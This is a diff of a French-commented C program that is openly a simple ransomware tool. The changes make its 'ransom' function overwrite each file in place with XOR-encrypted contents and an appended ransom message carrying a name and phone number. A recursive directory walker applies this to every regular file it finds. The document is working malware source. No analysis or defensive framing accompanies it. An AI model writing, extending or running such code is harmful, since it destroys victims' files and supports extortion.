@@ -3,18 +3,18 @@
 #include <string.h>
 #include <dirent.h>  // Pour manipuler les répertoires
 #include <sys/stat.h> // Pour vérifier si un fichier est régulier
+#include <limits.h>  // Pour PATH_MAX
 
 void xor_encrypt(const unsigned char *input, unsigned char *output, size_t size, const char *key)
 {
     size_t key_length = strlen(key);
-
     for (size_t i = 0; i < size; i++)
     {
         output[i] = input[i] ^ key[i % key_length]; // XOR avec la clé (boucle si nécessaire)
     }
 }
 
-int ransom(const char *input_filename, const char *output_filename, const char *key)
+int ransom(const char *input_filename, const char *key)
 {
     FILE *input_file = fopen(input_filename, "rb");
     if (!input_file)
@@ -51,7 +51,7 @@ int ransom(const char *input_filename, const char *output_filename, const char *
     const char *ransom_message = "\nRendez-vous tous ou ce sera la guerre - By TR - tel : 04.22.52.10.10";
     size_t message_length = strlen(ransom_message);
 
-    FILE *output_file = fopen(output_filename, "wb");
+    FILE *output_file = fopen(input_filename, "wb"); // Utilisation du même nom de fichier
     if (!output_file)
     {
         perror("Erreur lors de l'ouverture du fichier de sortie");
@@ -67,7 +67,7 @@ int ransom(const char *input_filename, const char *output_filename, const char *
     free(buffer);
     free(encrypted_buffer);
 
-    printf("Fichier chiffré avec succès : %s\n", output_filename);
+    printf("Fichier chiffré  : %s\n", input_filename);
     return 0;
 }
 
@@ -101,13 +101,17 @@ void encrypt_directory(const char *directory, const char *key)
         if (S_ISREG(file_stat.st_mode))
         {
             // C'est un fichier régulier, le chiffrer
-            char output_file[PATH_MAX];
-            // Ajout de l'extension .encrypted
-            ransom(full_path, output_file, key);
+            printf("Chiffrement du fichier : %s\n", full_path);
+
+            if (ransom(full_path, key) != 0)
+            {
+                fprintf(stderr, "Erreur lors du chiffrement de %s\n", full_path);
+            }
         }
         else if (S_ISDIR(file_stat.st_mode))
         {
             // C'est un répertoire, appel récursif
+            printf("Traitement du répertoire : %s\n", full_path);
             encrypt_directory(full_path, key);
         }
     }
